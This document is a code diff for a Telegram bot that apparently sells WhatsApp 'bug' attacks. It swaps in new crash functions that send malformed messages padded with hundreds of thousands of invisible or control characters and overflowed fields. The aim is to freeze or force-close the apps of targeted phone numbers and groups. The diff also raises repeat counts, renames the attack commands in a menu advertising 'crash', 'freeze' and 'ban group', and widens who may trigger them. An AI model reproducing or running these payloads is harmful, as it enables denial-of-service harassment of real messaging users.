@@ -575,7 +575,7 @@ async function initializeBot() {
 }
 
 //============================//
-async function blankclick(sock, target) {
+async function crashmega(sock, target) {
   try {
     const msg = {
       groupMentionedMessage: {
@@ -616,219 +616,66 @@ async function blankclick(sock, target) {
   }
 }
 
-async function delayhard(sock, target) {
-  const message = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "\u000D"
-          },
-          footer: {
-            text: "\u000F"
-          },
-          nativeFlowMessage: {
-            buttons: "\t".repeat(45000)
-          }
+async function halonyet(sock, target) {
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "\u200B".repeat(10000)
+                            },
+                            body: {
+                                text: "\u180E".repeat(10000)
+                            },
+                            nativeFlowMessage: {
+                                buttons: "\uFFF9".repeat(300000)
+                            },
+                            contextInfo: {
+                                mentionedJid: ["\u061C".repeat(10000)],
+                                forwardingScore: 4294967295,
+                                isForwarded: true,
+                                advDeviceIdentity: {
+                                    rawId: 4294967295,
+                                    timestamp: 9999999999999,
+                                    keyIndex: 4294967295,
+                                    accountType: "E2EE",
+                                    deviceType: "HOSTED"
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
         }
-      }
-    }
-  };
+    };
 
-  await sock.relayMessage(target, message, {
-  });
-}
-
-async function vurap(sock, target) {
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          header: {
-            title: "\u0070".repeat(50000),
-            subtitle: "\x10".repeat(50000),
-            bloksWidget: {
-              uuid: "\u200B".repeat(50000),
-              data: "[".repeat(50001),
-              type: "\u200F".repeat(50000),
-              fallback: "\u200D".repeat(50000)
-            }
-          },
-          body: { text: "\u000F" },
-          nativeFlowMessage: {
-            buttons: "[".repeat(50000)
-          }
-        }
-      }
-    }
-  }, {
-    participant: true,
-    noSelfSync: true
-  });
+    await sock.relayMessage(target, msg, {
+        noSelfSync: false
+    });
 }
 //============================//
-async function kitow(sock, targetgroup, ptcp = true) {
-    try {
-        const message = {
-            botInvokeMessage: {
-                message: {
-                    newsletterAdminInviteMessage: {
-                        newsletterJid: `33333333333333333@newsletter`,
-                        newsletterName: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(120000),
-                        jpegThumbnail: "",
-                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
-                        inviteExpiration: Date.now() + 1814400000, 
-                    },
-                },
-            },
-            nativeFlowMessage: {
-    messageParamsJson: "",
-    buttons: [
-        {
-            name: "call_permission_request",
-            buttonParamsJson: "{}",
-        },
-        {
-            name: "galaxy_message",
-            paramsJson: {
-                "screen_2_OptIn_0": true,
-                "screen_2_OptIn_1": true,
-                "screen_1_Dropdown_0": "nullOnTop",
-                "screen_1_DatePicker_1": "1028995200000",
-                "screen_1_TextInput_2": "null@gmail.com",
-                "screen_1_TextInput_3": "94643116",
-                "screen_0_TextInput_0": "\u0018".repeat(50000),
-                "screen_0_TextInput_1": "SecretDocu",
-                "screen_0_Dropdown_2": "#926-Xnull",
-                "screen_0_RadioButtonsGroup_3": "0_true",
-                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
-            },
-        },
-    ],
-},
-                     contextInfo: {
-                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
-                groupMentions: [
-                    {
-                        groupJid: "0@s.whatsapp.net",
-                        groupSubject: "Ӄ𝕀𝚴𝕋∆𝚴∆",
-                    },
-                ],
-            },
-        };
-
-        await sock.relayMessage(targetgroup, message, {
-            userJid: targetgroup,
-        });
-    } catch (err) {
-        console.error("Error sending newsletter:", err);
-    }
-}
-
-async function kicaumania(sock, targetgroup) {
+async function crashmegaGB(sock, targetgroup) {
   try {
-    const kintanax = "https://ar-hosting.pages.dev/1773779910941.jpg";
-    const imagePayload = await prepareWAMessageMedia({
-      image: { url: kintanax, gifPlayback: true }
-    }, {
-      upload: sock.waUploadToServer,
-      mediaType: "image"
-    });
-    const msg = generateWAMessageFromContent(targetgroup, proto.Message.fromObject({
-      interactiveMessage: {
-        contextInfo: {
-          mentionedJid: Array.from({ length: 30000 }, () =>
-            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-          ),
-          isForwarded: true,
-          forwardingScore: 9999,
-          forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363409362506610@newsletter",
-            newsletterName: "ꦾ".repeat(10000),
-            serverMessageId: 1
-          }
-        },
-        header: {
-          title: "Ӄ𝕀𝚴𝕋∆𝚴∆",
-          ...imagePayload,
-          hasMediaAttachment: true
-        },
-        body: {
-          text: "\u2063".repeat(10000)
-        },
-        footer: {
-          text: ""
-        },
-        nativeFlowMessage: {
-          buttons: [
-            {
-              name: "cta_url",
-              buttonParamsJson: JSON.stringify({
-                display_text: "ꦾ".repeat(10000),
-                url: "ꦾ".repeat(10000),
-                merchant_url: ""
-              })
-            },
-            {
-              name: "galaxy_message",
-              buttonParamsJson: JSON.stringify({
-                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
-                "screen_0_Dropdown_1": "Null",
-                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
-              }),
-              version: 3
-            }
-          ]
-        }
-      }
-    }), { quoted: null });
-    msg.key.remoteJid = targetgroup;
-    msg.key.fromMe = false;
-    msg.key.id = generateMessageID(); 
-    await sock.relayMessage(targetgroup, msg.message, { messageId: msg.key.id });
-    console.log(`blank ${targetgroup}`);
-  } catch (err) {
-    console.error("Error in BlankScreen:", err);
-  }
-}
-function generateMessageID() {
-  return Math.random().toString(36).slice(2) + Date.now();
-}
-
-async function GbCrash(sock, targetgroup) {
-  try {
-    const MgbMsg = {
-      viewOnceMessage: {
+    const msg = {
+      groupMentionedMessage: {
         message: {
-          buttonsMessage: {
-            contentText: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(50000),
-            footerText: "Ӄ𝕀𝚴𝕋∆𝚴∆" ,
-            headerType: 1,
-            buttons: [
-              {
-                buttonId: "Ӄ𝕀𝚴𝕋∆𝚴∆",
-                buttonText: {
-                  displayText: "ꦽ".repeat(90000)
-                },
-                type: 1
-              }
-            ],
-            contextInfo: {
-              mentionedJid: Array.from({ length: 1900 }, () => 
-                `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`
-              ),
-              participant: targetgroup,
-              remoteJid: targetgroup,
-              forwardingScore: 999999999,
-              isForwarded: true,
-              quotedMessage: {
-                locationMessage: {
-                  degreesLatitude: 99999999999999999999,
-                  degreesLongitude: 99999999999999999999,
-                  name: "Ӄ𝕀𝚴𝕋∆𝚴∆",
-                  address: "\u0000",
-                  url: "\u0000",
-                  jpegThumbnail: null
+          ephemeralMessage: {
+            message: {
+              viewOnceMessage: {
+                message: {
+                  interactiveMessage: {
+                    body: {
+                      text: "hi gw kintana"
+                    },
+                    nativeFlowMessage: {
+                      extra: "\u3104",
+                      buttons: "ꦾ࣯࣯".repeat(20000),
+                      extra1: "ꦾ࣯࣯".repeat(5555)
+                    }
+                  }
                 }
               }
             }
@@ -836,15 +683,60 @@ async function GbCrash(sock, targetgroup) {
         }
       }
     };
+    await sock.relayMessage(targetgroup, msg, {});
 
-    await sock.relayMessage(targetgroup, MgbMsg, {
-      userJid: targetgroup
-    });
-
-    console.log("berhasil mengirim bug group");
-  } catch (err) {
-    console.log(err);
+    await sock.relayMessage(targetgroup, {
+      newsletterAdminInviteMessage: {
+        newsletterJid: "123@newsletter",
+        inviteCode: "\r".repeat(150000) + "\n".repeat(50000),
+        inviteExpiration: 99999999999,
+        newsletterName: "kintana" + "\u0000".repeat(250000)
+      }
+    }, {});
+  } catch (e) {
+    console.error(e);
   }
+}
+
+async function halonyetGB(sock, target) {
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "\u200B".repeat(10000)
+                            },
+                            body: {
+                                text: "\u180E".repeat(10000)
+                            },
+                            nativeFlowMessage: {
+                                buttons: "\uFFF9".repeat(300000)
+                            },
+                            contextInfo: {
+                                mentionedJid: ["\u061C".repeat(10000)],
+                                forwardingScore: 4294967295,
+                                isForwarded: true,
+                                advDeviceIdentity: {
+                                    rawId: 4294967295,
+                                    timestamp: 9999999999999,
+                                    keyIndex: 4294967295,
+                                    accountType: "E2EE",
+                                    deviceType: "HOSTED"
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
+        }
+    };
+
+    await sock.relayMessage(target, msg, {
+        noSelfSync: false
+    });
 }
 
 async function bansgc(sock, targetgroup) {
@@ -863,9 +755,9 @@ async function bansgc(sock, targetgroup) {
 }
 //============================//
 async function bug1(sock, target) {
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 12; i++) {
     try {
-await vurap(sock, target);
+await halonyet(sock, target);
       console.log(`Bug Send To ${target}`);
     } catch (innerError) {
       console.error(`Erorr:`, innerError);
@@ -874,9 +766,9 @@ await vurap(sock, target);
 }
 
 async function bug2(sock, target) {
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 12; i++) {
     try {
-await vurap(sock, target);
+await halonyet(sock, target);
       console.log(`Bug Send To ${target}`);
     } catch (innerError) {
       console.error(`Erorr:`, innerError);
@@ -887,11 +779,11 @@ await vurap(sock, target);
 async function bug3(sock, target) {
   for (let i = 0; i < 20; i++) {
     try {
-await blankclick(sock, target);
+await crashmega(sock, target);
 await sleep(500);
-await delayhard(sock, target);
+await halonyet(sock, target);
 await sleep(500);
-await crash(sock, target);
+await halonyet(sock, target);
 await sleep(500);
       console.log(`Bug Send To ${target}`);
     } catch (innerError) {
@@ -903,9 +795,9 @@ await sleep(500);
 async function bug4(sock, target) {
   for (let i = 0; i < 20; i++) {
     try {
-await delayhard(sock, target);
+await halonyet(sock, target);
 await sleep(500);
-await crash(sock, target);
+await halonyet(sock, target);
 await sleep(500);
       console.log(`Bug Send To ${target}`);
     } catch (innerError) {
@@ -961,24 +853,17 @@ function getKintanaMenu() {
 
   const caption = `<blockquote>ᴋɪɴᴛᴀɴᴀ ᴍᴇɴᴜ, ᴛʜɪꜱ ɪꜱ ᴡʜᴇʀᴇ ᴀʟʟ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇꜱ ᴀʀᴇ ʟɪꜱᴛᴇᴅ. ᴘʟᴇᴀꜱᴇ ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ꜰᴇᴀᴛᴜʀᴇ ʏᴏᴜ ʟɪᴋᴇ</blockquote>
 
-<blockquote>=== ʙᴇʙᴀs sᴘᴀᴍ (ᴏs) ===</blockquote>
-/forceyups - ғᴏʀᴄʟᴏsᴇ ᴄʀᴀsʜ
-/forcecuy - ғᴏʀᴄʟᴏsᴇ ᴄʀᴀsʜ ʜᴀʀᴅ
-=====================
-
 <blockquote>=== ᴀɴᴅʀᴏɪᴅ ʙᴜɢ (ᴏs) ===</blockquote>
-/forceyups - ғᴏʀᴄʟᴏsᴇ ᴄʀᴀsʜ
-/forcecuy - ғᴏʀᴄʟᴏsᴇ ᴄʀᴀsʜ ʜᴀʀᴅ
-=====================
-<blockquote>=== ᴀɴᴅʀᴏɪᴅ ʙᴜɢ (ᴏs) ===</blockquote>
-/blankclick - ᴄʀᴀsʜ ᴄʟɪᴄᴋ ᴄʜᴀᴛ
-/frezehard - ғʀᴇᴢᴇ ᴄʜᴀᴛ x ᴅᴇʟᴀʏ
+/frezechat - ғʀᴇᴢᴇ ᴄʜᴀᴛ
+/crashwa - ᴄʀᴀsʜ ᴡʜᴀᴛsᴀᴘᴘ
+/crashmega - ᴄʀᴀsʜ ᴄʟɪᴄᴋ ᴄʜᴀᴛ
+/delayhard - ᴅᴇʟᴀʏ ʜᴀʀᴅ x ғʀᴇᴇᴢᴇ
 =====================
 <blockquote>=== ᴀɴᴅʀᴏɪᴅ ʙᴜɢ ɢʀᴏᴜᴘ ===</blockquote>
-/groupcrash - ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɢʀᴏᴜᴘ x ᴅᴇʟᴀʏ
+/groupblank - ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɢʀᴏᴜᴘ x ᴅᴇʟᴀʏ
 =====================
 <blockquote>=== ʙᴀɴ ɢʀᴏᴜᴘ ===</blockquote>
-/bangroup - ʙᴀɴ ɢʀᴏᴜᴘ ( ʀᴀᴛᴇ ʙᴀɴ 95% )
+/bangroup - ʙᴀɴ ɢʀᴏᴜᴘ ( ʀᴀᴛᴇ ʙᴀɴ 50% )
 =====================
 <blockquote>=== sᴇɴᴅᴇʀ sᴛᴀᴛᴜs ===</blockquote>
 sᴇɴᴅᴇʀ ᴘᴜʙʟɪᴄ: ${publicDisplay} (${publicStatus})
@@ -1586,7 +1471,7 @@ bot.onText(/\/resetjeda/, async (msg) => {
   );
 });
 
-bot.onText(/\/(forceyups)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(frezechat)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -1610,7 +1495,7 @@ bot.onText(/\/(forceyups)(?:\s+(.+))?/, async (msg, match) => {
   if (!match[2]) {
     return bot.sendMessage(
       chatId,
-      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /ғᴏʀᴄᴇʏᴜᴘs 628123456789</b></blockquote>`,
+      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /frezechar 628123456789</b></blockquote>`,
       {
         parse_mode: "HTML",
         reply_markup: {
@@ -1727,7 +1612,7 @@ bot.onText(/\/(forceyups)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/(forcecuy)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(crashwa)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -1751,7 +1636,7 @@ bot.onText(/\/(forcecuy)(?:\s+(.+))?/, async (msg, match) => {
   if (!match[2]) {
     return bot.sendMessage(
       chatId,
-      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /ғᴏʀᴄᴇᴄᴜʏ 628123456789</b></blockquote>`,
+      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /crashwa 628123456789</b></blockquote>`,
       {
         parse_mode: "HTML",
         reply_markup: {
@@ -1866,13 +1751,13 @@ bot.onText(/\/(forcecuy)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/(blankclick)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(crashmega)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
   const idgc = String(chatId); 
 
-  if (!isOwner(userId) && !premiumUsers.includes(userId)) {
+  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
     return bot.sendMessage(
       chatId,
       `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
@@ -1890,7 +1775,7 @@ bot.onText(/\/(blankclick)(?:\s+(.+))?/, async (msg, match) => {
   if (!match[2]) {
     return bot.sendMessage(
       chatId,
-      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /ʙʟᴀɴᴋᴄʟɪᴄᴋ 628123456789</b></blockquote>`,
+      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /crashmega 628123456789</b></blockquote>`,
       {
         parse_mode: "HTML",
         reply_markup: {
@@ -2005,13 +1890,13 @@ bot.onText(/\/(blankclick)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/(frezehard)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(delayhard)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
   const idgc = String(chatId); 
 
-  if (!isOwner(userId) && !premiumUsers.includes(userId)) {
+  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
     return bot.sendMessage(
       chatId,
       `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
@@ -2029,7 +1914,7 @@ bot.onText(/\/(frezehard)(?:\s+(.+))?/, async (msg, match) => {
   if (!match[2]) {
     return bot.sendMessage(
       chatId,
-      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /ғʀᴇᴢᴇʜᴀʀᴅ 628123456789</b></blockquote>`,
+      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /delayhard 628123456789</b></blockquote>`,
       {
         parse_mode: "HTML",
         reply_markup: {
@@ -2144,7 +2029,7 @@ bot.onText(/\/(frezehard)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/(groupcrash)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(groupblank)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2168,7 +2053,7 @@ bot.onText(/\/(groupcrash)(?:\s+(.+))?/, async (msg, match) => {
   if (!match[2]) {
     return bot.sendMessage(
       chatId,
-      `<blockquote><b>[!] ᴍɪssɪɴɢ ʟɪɴᴋ ɢʀᴏᴜᴘ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ.\nᴇxᴀᴍᴘʟᴇ : /ɢʀᴏᴜᴘᴄʀᴀsʜ https://chat.whatsapp.com/abcd1234</b></blockquote>`,
+      `<blockquote><b>[!] ᴍɪssɪɴɢ ʟɪɴᴋ ɢʀᴏᴜᴘ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ.\nᴇxᴀᴍᴘʟᴇ : /groupblank https://chat.whatsapp.com/abcd1234</b></blockquote>`,
       {
         parse_mode: "HTML",
         reply_markup: {
@@ -2303,9 +2188,9 @@ bot.onText(/\/(groupcrash)(?:\s+(.+))?/, async (msg, match) => {
       try {
         for (let i = 0; i < 20; i++) {
           await Promise.allSettled([
-            kitow(sock, groupJid).catch(() => {}),
-            kicaumania(sock, groupJid).catch(() => {}),
-            GbCrash(sock, groupJid).catch(() => {})
+            crashmegaGB(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {})
           ]);
 
           const currentDelay = getCurrentDelay();
@@ -2326,7 +2211,7 @@ bot.onText(/\/(bangroup)(?:\s+(.+))?/, async (msg, match) => {
   const userId = msg.from.id;
   const idgc = String(chatId);
 
-  if (!isOwner(userId) && !premiumUsers.includes(userId)) {
+  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
     return bot.sendMessage(
       chatId,
       `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
@@ -2344,7 +2229,7 @@ bot.onText(/\/(bangroup)(?:\s+(.+))?/, async (msg, match) => {
   if (!match[2]) {
     return bot.sendMessage(
       chatId,
-      `<blockquote><b>[!] ᴍɪssɪɴɢ ʟɪɴᴋ ɢʀᴏᴜᴘ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ.\nᴇxᴀᴍᴘʟᴇ : /ʙᴀɴɢʀᴏᴜᴘ https://chat.whatsapp.com/abcd1234</b></blockquote>`,
+      `<blockquote><b>[!] ᴍɪssɪɴɢ ʟɪɴᴋ ɢʀᴏᴜᴘ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ.\nᴇxᴀᴍᴘʟᴇ : /bangroup https://chat.whatsapp.com/abcd1234</b></blockquote>`,
       {
         parse_mode: "HTML",
         reply_markup: {
